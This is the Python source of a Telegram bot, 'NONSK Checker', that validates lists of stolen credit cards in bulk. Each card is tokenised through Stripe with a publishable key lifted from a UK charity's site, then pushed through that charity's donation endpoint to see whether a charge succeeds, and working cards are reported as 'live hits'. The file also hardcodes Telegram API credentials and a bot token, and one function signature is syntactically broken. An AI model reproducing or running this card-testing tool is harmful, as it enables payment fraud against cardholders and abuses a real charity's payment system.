import json
import requests
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

# Bot Configuration
API_ID = "28271744"
API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"
BOT_TOKEN = "7393878224:AAGTFjEclUdXYI0NzaRUUqmRUwFrNBhYVKo"

bot = Client("CardCheckerBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Variables to track the results
results = {
    "total": 0,
    "cvv": 0,
    "ccn": 0,
    "approved": 0,
    "dead": 0,
    "live_cards": [],
}

# Admin ID (replace with your actual admin ID)
ADMIN_ID = 5429071679  # Replace with your actual admin ID


def check_card_details(card):
    try:
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = "0" + mes
        if len(ano) == 2:
            ano = "20" + ano

        # 1st Request
        token_url = "https://api.stripe.com/v1/tokens"
        headers_1 = {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        data_1 = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'key': 'pk_live_oeBlScsEPKeBvHnRXizVNSl4',
        }

        response_1 = requests.post(token_url, headers=headers_1, data=data_1)
        result_1 = response_1.json()

        if response_1.status_code != 200 or "error" in result_1:
            return {
                "status": "DEAD",
                "message": result_1.get('error', {}).get('message', 'Unknown error'),
                "decline_code": result_1.get('error', {}).get('code', 'unknown_error'),
                "gateway": "Stripe [Oneummah]"
            }

        token_id = result_1.get("id", "")
        brand = result_1.get("card", {}).get("brand", "Unknown")

        # 2nd Request
        donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php"
        headers_2 = {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        data_2 = {
            'action': 'k14_submit_donation',
            'token': token_id,
            'data': 'donation_id=503695',
        }

        response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
        result_2 = response_2.json()

        if result_2.get("res") is False:
            return {
                "status": "DEAD",
                "message": result_2.get('message', 'Unknown error'),
                "decline_code": result_2.get('error', {}).get('error', {}).get('decline_code', 'unknown_decline'),
                "gateway": "Stripe [Oneummah]"
            }

        # Handle successful responses
        if "succeeded" in result_2.get("message", ""):
            return {
                "status": "CHARGED",
                "message": "Payment succeeded.",
                "decline_code": "",
                "gateway": "Stripe [Oneummah]"
            }

        return {
            "status": "UNKNOWN",
            "message": "Unknown response.",
            "decline_code": "",
            "gateway": "Stripe [Oneummah]"
        }

    except Exception as e:
        return {
            "status": "ERROR",
            "message": str(e),
            "decline_code": "",
            "gateway": "Stripe [Oneummah]"
        }


@bot.on_message(filters.command("start"))
async def start_command(client, message: Message):
    await message.reply_text(
        "**Welcome to NONSK Checker Bot!**\n\nUse /chk to check your cards.",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Support", url="https://t.me/YourSupportChannel")]]
        ),
    )


@bot.on_message(filters.command("chk") & filters.reply)
async def check_cards(client, message: Message):
    global results
    results = {
        "total": 0 ,
        "cvv": 0,
        "ccn": 0,
        "approved": 0,
        "dead": 0,
        "live_cards": [],
    }

    if not message.reply_to_message.document:
        await message.reply_text("❌ Please reply to a valid TXT file containing CC details.")
        return

    file_path = await message.reply_to_message.download()
    with open(file_path, "r") as file:
        cards = file.readlines()

    results["total"] = len(cards)
    msg = await message.reply_text(
        f"**Found {results['total']} cards.**\n\nStarting checking...\nPlease wait."
    )

    for index, card in enumerate(cards, start=1):
        card = card.strip()
        status = check_card_details(card)

        if status["status"] == "CHARGED":
            results["cvv"] += 1
            results["live_cards"].append(card)
        elif status["status"] == "DEAD":
            results["dead"] += 1
        else:
            results["ccn"] += 1

        await msg.edit_text(
            f"↯ **NONSK CHECKER**\n\n"
            f"**CC:** {card}\n"
            f"**Gateway:** {status['gateway']}\n"
            f"**Status:** {status['status']} ❌\n"
            f"**Message:** {status['message']}\n"
            f"**Reason:** {status['decline_code']}\n\n"
            f"**Checking Info**\n"
            f"________________________\n"
            f"**Total:** {results['total']}\n"
            f"**Checked:** {index}\n"
            f"**Live:** {results['cvv']}\n"
            f"**Dead:** {results['dead']}\n",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(f"Live: {results['cvv']}", callback_data="show_live"),
                        InlineKeyboardButton(f"Dead: {results['dead']}", callback_data="show_dead"),
                    ]
                ]
            ),
        )

    await msg.edit_text(
        f"**GAME OVER**\n\n"
        f"**CHECKING RESULT**\n"
        f"___________________\n"
        f"**TOTAL:** {results['total']}\n"
        f"**CVV:** {results['cvv']}\n"
        f"**CCN:** {results['ccn']}\n"
        f"**Approved:** {results['cvv']}\n"
        f"**Dead:** {results['dead']}",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Send Hits", callback_data="send_hits")]]
        ),
    )


@bot.on_callback_query(filters.regex("show_live"))
async def show_live(client, callback_query):
    if results["live_cards"]:
        hits = "\n".join(results["live_cards"])
        await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
    else:
        await callback_query.answer("No live hits found!", show_alert=True)


@bot.on_callback_query(filters.regex("send_hits"))
async def send_hits(client, callback_query):
    if results["live_cards"]:
        hits = "\n".join(results["live_cards"])
        await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
    else:
        await callback_query.answer("No live hits to send!", show_alert=True)


@bot.on_message(filters.command("admin") & filters.user(ADMIN_ID))
async def admin_interface(client, message: Message):
    await message.reply_text(
        "**Admin Interface**\n\n"
        "Use the following commands to manage the bot:\n"
        "/stats - View current statistics\n"
        "/reset - Reset the bot's data",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("View Stats", callback_data="view_stats")],
                [InlineKeyboardButton("Reset Data", callback_data="reset_data")]
            ]
        )
    )


@bot.on_callback_query(filters.regex("view_stats"))
async def view_stats(client, callback_query):
    await callback_query.answer()
    stats_message = (
        f"**Current Statistics**\n"
        f"Total Cards Checked: {results['total']}\n"
        f"Live Cards: {results['cvv']}\n"
        f"Dead Cards: {results['dead']}\n"
        f"CCN Issues: {results['ccn']}\n"
    )
    await callback_query.message.reply_text(stats_message)


@bot.on_callback_query(filters.regex("reset_data"))
async def reset_data(client, callback_query await callback_query.answer()
    global results
    results = {
        "total": 0,
        "cvv": 0,
        "ccn": 0,
        "approved": 0,
        "dead": 0,
        "live_cards": [],
    }
    await callback_query.message.reply_text("✅ Data has been reset successfully!")


if __name__ == "__main__":
    bot.run()
